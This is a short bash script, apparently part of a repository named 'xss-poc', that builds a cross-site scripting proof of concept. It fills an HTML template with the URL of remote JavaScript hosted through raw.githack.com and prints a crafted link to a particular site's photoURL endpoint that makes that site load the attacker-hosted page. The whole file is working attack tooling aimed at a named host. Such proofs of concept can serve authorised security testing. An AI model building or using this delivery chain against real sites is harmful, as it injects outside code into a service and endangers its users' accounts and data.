#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
GH_USER="${GH_USER:-nhd2106}"
REPO="${REPO:-xss-poc}"
BRANCH="${BRANCH:-main}"

enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }

JS_URL="https://raw.githack.com/$GH_USER/$REPO/$BRANCH/viewer.js"
HTML_URL="https://raw.githack.com/$GH_USER/$REPO/$BRANCH/poc.html"

sed "s|__JS__|$(enc "$JS_URL")|" poc.template.html > poc.html

echo "JS : $JS_URL"
echo "HTML: $HTML_URL"
echo "LINK: https://qa-aiox.back3nd.xyz/api/user/photoURL?url=$(enc "$HTML_URL")"
